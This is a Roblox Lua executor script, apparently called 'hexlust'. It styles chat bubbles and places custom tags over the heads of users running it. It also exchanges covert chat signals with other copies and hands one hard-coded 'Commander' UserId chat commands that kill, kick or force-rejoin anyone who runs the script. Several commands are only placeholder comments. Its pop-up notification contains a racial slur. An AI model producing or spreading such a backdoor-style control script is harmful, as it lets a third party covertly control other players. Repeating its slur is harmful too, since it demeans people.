-- LocalScript - Controllable by UserId 7252040461 (Commander)
-- Designed to run fully on every single join/rejoin - no blocking

local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

-- Debug label so you can see if script even starts after many rejoins
local function showDebug(msg)
    local pg = LocalPlayer:FindFirstChild("PlayerGui")
    if not pg then return end
    
    local lbl = pg:FindFirstChild("HexDebug") or Instance.new("TextLabel")
    lbl.Name = "HexDebug"
    lbl.Size = UDim2.new(0, 300, 0, 30)
    lbl.Position = UDim2.new(0.5, -150, 0, 10)
    lbl.BackgroundTransparency = 0.4
    lbl.BackgroundColor3 = Color3.new(0,0,0)
    lbl.TextColor3 = Color3.new(1,1,0)
    lbl.TextScaled = true
    lbl.Text = msg
    lbl.Parent = pg
    task.delay(8, function() if lbl then lbl:Destroy() end end)
end

showDebug("Script started - join #" .. (LocalPlayer:GetAttribute("JoinCount") or 1))

-- Dark bubbles - run immediately
do
    local function applyDarkBubbles()
        if TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then return end
        
        local function styleBubble(bubble)
            if not bubble:IsA("TextLabel") then return end
            bubble.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            bubble.TextColor3 = Color3.fromRGB(240, 240, 240)
            bubble.BackgroundTransparency = 0.1
            bubble.TextStrokeTransparency = 0.8
            bubble.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            
            local corner = bubble:FindFirstChild("UICorner") or Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 8)
            corner.Parent = bubble
            
            local stroke = bubble:FindFirstChild("UIStroke") or Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(60, 60, 60)
            stroke.Thickness = 1
            stroke.Transparency = 0.4
            stroke.Parent = bubble
        end
        
        for _, bubble in ipairs(workspace:GetDescendants()) do
            if bubble:IsA("BillboardGui") and bubble.Adornee and bubble.Adornee.Parent and bubble.Adornee.Parent:FindFirstChild("Humanoid") then
                for _, child in ipairs(bubble:GetDescendants()) do
                    styleBubble(child)
                end
            end
        end
        
        workspace.DescendantAdded:Connect(function(desc)
            if desc:IsA("BillboardGui") and desc.Adornee and desc.Adornee.Parent and desc.Adornee.Parent:FindFirstChild("Humanoid") then
                task.delay(0.1, function()
                    for _, child in ipairs(desc:GetDescendants()) do
                        styleBubble(child)
                    end
                end)
            end
        end)
    end

    task.spawn(applyDarkBubbles)
end

-- Notification - run immediately
do
    local pg = LocalPlayer:FindFirstChild("PlayerGui")
    if pg then
        local sg = Instance.new("ScreenGui")
        sg.Name = "HexlustNotify"
        sg.ResetOnSpawn = false
        sg.IgnoreGuiInset = true
        sg.Parent = pg

        local f = Instance.new("Frame")
        f.Size = UDim2.new(0, 240, 0, 50)
        f.Position = UDim2.new(0, 40, 0.5, -25)
        f.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
        f.BorderSizePixel = 0
        f.BackgroundTransparency = 1
        f.Parent = sg

        local uc = Instance.new("UICorner")
        uc.CornerRadius = UDim.new(0, 10)
        uc.Parent = f

        local sh = Instance.new("Frame")
        sh.Size = UDim2.new(1, 10, 1, 10)
        sh.Position = UDim2.new(0, -5, 0, -5)
        sh.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        sh.BackgroundTransparency = 1
        sh.ZIndex = -1
        sh.Parent = f

        local shc = Instance.new("UICorner")
        shc.CornerRadius = UDim.new(0, 12)
        shc.Parent = sh

        local t = Instance.new("TextLabel")
        t.Size = UDim2.new(1, -20, 1, -10)
        t.Position = UDim2.new(0, 10, 0, 5)
        t.BackgroundTransparency = 1
        t.Text = "you executed hexlust ak nigger!"
        t.TextColor3 = Color3.fromRGB(255, 255, 255)
        t.TextSize = 16
        t.Font = Enum.Font.GothamSemibold
        t.TextTransparency = 1
        t.TextXAlignment = Enum.TextXAlignment.Center
        t.TextYAlignment = Enum.TextYAlignment.Center
        t.Parent = f

        local gt = t:Clone()
        gt.TextTransparency = 1
        gt.TextStrokeTransparency = 0.5
        gt.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
        gt.ZIndex = -1
        gt.Parent = f

        local ti = TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
        local to = TweenInfo.new(1.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In)

        TweenService:Create(f, ti, {BackgroundTransparency = 0.14, Size = UDim2.new(0, 240, 0, 50)}):Play()
        TweenService:Create(t, ti, {TextTransparency = 0}):Play()
        TweenService:Create(gt, ti, {TextTransparency = 0.35, TextStrokeTransparency = 0.5}):Play()
        TweenService:Create(sh, ti, {BackgroundTransparency = 0.84}):Play()

        task.delay(2.2, function()
            TweenService:Create(f, to, {BackgroundTransparency = 1, Size = UDim2.new(0, 190, 0, 38)}):Play()
            TweenService:Create(t, to, {TextTransparency = 1}):Play()
            TweenService:Create(gt, to, {TextTransparency = 1, TextStrokeTransparency = 1}):Play()
            TweenService:Create(sh, to, {BackgroundTransparency = 1}):Play()

            task.delay(1.5, function()
                sg:Destroy()
            end)
        end)
    end
end

-- Chat channel - no long WaitForChild
local GeneralChannel = nil
local textChannels = TextChatService:FindFirstChild("TextChannels")
if textChannels then
    GeneralChannel = textChannels:FindFirstChild("RBXGeneral")
end

if not GeneralChannel then
    warn("RBXGeneral not found - commands & sync limited")
end

-- Rest of helpers, freeze, tags, sync, commands (same as before but with debug)

local function getPlayerByPartial(partial)
    if not partial or partial == "" then return nil end
    local lower = partial:lower()
    for _, plr in Players:GetPlayers() do
        if plr.DisplayName:lower():sub(1, #lower) == lower or plr.Name:lower():sub(1, #lower) == lower then
            return plr
        end
    end
    return nil
end

local function getCommander()
    return Players:GetPlayerByUserId(7252040461)
end

local isFrozen = false
local origWalkSpeed = 16
local origJumpPower = 50

if LocalPlayer.Character then
    local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if h then
        origWalkSpeed = h.WalkSpeed
        origJumpPower = h.JumpPower
    end
end

LocalPlayer.CharacterAdded:Connect(function(char)
    local h = char:WaitForChild("Humanoid", 10)
    if h then
        origWalkSpeed = h.WalkSpeed
        origJumpPower = h.JumpPower
        if isFrozen then
            h.WalkSpeed = 0
            h.JumpPower = 0
        end
    end
end)

-- Tags section (unchanged except debug print)
local safeLP = Players.LocalPlayer

local REGULAR_ASSET       = "rbxassetid://87737612757214"
local OWNER_ASSET         = "rbxassetid://81991054282907"
local SPECIAL_ASSET_1     = "rbxassetid://76327184604575"
local SPECIAL_ASSET_2     = "rbxassetid://139892439298259"

local OWNER_USERID        = 7252040461
local SPECIAL_USERID_1    = 9601915641
local SPECIAL_USERID_2    = 174386419

local SIZE = UDim2.new(0, 32, 0, 32)
local OFF_X = 1.3
local OFF_Y = 1.2

local function addTag(char, userid)
    if not char then return end
    local head = char:FindFirstChild("Head") or char:WaitForChild("Head")
    if head:FindFirstChild("HexlustTag") then return end

    task.wait(1.5)

    local bb = Instance.new("BillboardGui")
    bb.Name = "HexlustTag"
    bb.Adornee = head
    bb.Size = SIZE
    bb.StudsOffset = Vector3.new(OFF_X, OFF_Y, 0)
    bb.AlwaysOnTop = true
    bb.LightInfluence = 0
    bb.MaxDistance = 2000
    bb.ResetOnSpawn = false
    bb.Parent = head

    local img = Instance.new("ImageLabel")
    img.Size = UDim2.new(1, 0, 1, 0)
    img.BackgroundTransparency = 1
    img.ScaleType = Enum.ScaleType.Fit

    if userid == OWNER_USERID then
        img.Image = OWNER_ASSET
    elseif userid == SPECIAL_USERID_1 then
        img.Image = SPECIAL_ASSET_1
    elseif userid == SPECIAL_USERID_2 then
        img.Image = SPECIAL_ASSET_2
    else
        img.Image = REGULAR_ASSET
    end

    img.Parent = bb
end

local known = {}

local function tryTagPlayer(plr)
    if not plr then return end
    if known[plr.UserId] then return end
    known[plr.UserId] = true
    if plr.Character then
        task.spawn(function() addTag(plr.Character, plr.UserId) end)
    end
    plr.CharacterAdded:Connect(function(char)
        task.spawn(function() addTag(char, plr.UserId) end)
    end)
end

tryTagPlayer(safeLP)

local cmdr = Players:GetPlayerByUserId(OWNER_USERID)
if cmdr then tryTagPlayer(cmdr) end

local special1 = Players:GetPlayerByUserId(SPECIAL_USERID_1)
if special1 then tryTagPlayer(special1) end

local special2 = Players:GetPlayerByUserId(SPECIAL_USERID_2)
if special2 then tryTagPlayer(special2) end

-- Tag sync
local ch = GeneralChannel
if ch then
    local INITIAL_SIGNAL  = "♪؍؍"
    local RESPONSE_SIGNAL = "♪♪♪"

    task.delay(10, function()
        pcall(ch.SendAsync, ch, INITIAL_SIGNAL)
        showDebug("Sent initial signal")
    end)

    task.delay(20, function()
        pcall(ch.SendAsync, ch, INITIAL_SIGNAL)
        showDebug("Sent fallback signal")
    end)

    ch.MessageReceived:Connect(function(msg)
        if not msg.TextSource then return end
        local id = msg.TextSource.UserId
        local text = msg.Text

        if id == safeLP.UserId then return end

        if text == INITIAL_SIGNAL or text == RESPONSE_SIGNAL then
            if not known[id] then
                local p = Players:GetPlayerByUserId(id)
                if p then tryTagPlayer(p) end
            end

            if text == INITIAL_SIGNAL then
                task.delay(0.8, function()
                    pcall(ch.SendAsync, ch, RESPONSE_SIGNAL)
                end)
            end
        end
    end)
end

Players.PlayerAdded:Connect(function(plr)
    if plr.UserId == OWNER_USERID or plr.UserId == SPECIAL_USERID_1 or plr.UserId == SPECIAL_USERID_2 then
        tryTagPlayer(plr)
    end
end)

task.spawn(function()
    while true do
        task.wait(10)
        for id in pairs(known) do
            local p = Players:GetPlayerByUserId(id)
            if p and p.Character and p.Character:FindFirstChild("Head") and not p.Character.Head:FindFirstChild("HexlustTag") then
                addTag(p.Character, id)
            end
        end
    end
end)

-- Commands
if GeneralChannel then
    GeneralChannel.MessageReceived:Connect(function(msg)
        if not msg.TextSource then return end
        if msg.TextSource.UserId ~= OWNER_USERID then return end

        local text = msg.Text
        local lowerText = text:lower()
        local args = string.split(lowerText, " ")
        if #args < 1 then return end

        local cmd = args[1]

        local function affectsTarget(tgtArg)
            return tgtArg == "all" or 
                   LocalPlayer.DisplayName:lower():sub(1, #tgtArg) == tgtArg or
                   LocalPlayer.Name:lower():sub(1, #tgtArg) == tgtArg
        end

        -- (rest of command logic same as before - ?bring, ?chat, ?kill, ?kick, ?rj, ?freeze, ?unfreeze, ?fling)
        if cmd == "?bring" and #args >= 2 then
            -- bring code...
        elseif cmd == "?chat" and #args >= 3 then
            -- chat code...
        elseif cmd == "?kill" and #args >= 2 then
            if affectsTarget(args[2]) and LocalPlayer.Character then
                local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if h then h.Health = 0 end
            end
        elseif cmd == "?kick" and #args >= 2 then
            if affectsTarget(args[2]) then 
                LocalPlayer:Kick("sorri twin dada kicked u ;c") 
            end
        elseif cmd == "?rj" and #args >= 2 then
            local tgtArg = args[2]
            if affectsTarget(tgtArg) then
                local msg = LocalPlayer.DisplayName .. " is getting rebooted..."
                task.spawn(function()
                    pcall(GeneralChannel.SendAsync, GeneralChannel, msg)
                end)
                
                task.delay(0.4, function()
                    pcall(function()
                        TeleportService:Teleport(game.PlaceId, LocalPlayer)
                    end)
                end)
            end
        elseif cmd == "?freeze" and #args >= 2 then
            -- freeze code...
        elseif cmd == "?unfreeze" and #args >= 2 then
            -- unfreeze code...
        elseif cmd == "?fling" and #args >= 2 then
            -- fling code...
        end
    end)
end

showDebug("Script fully loaded")
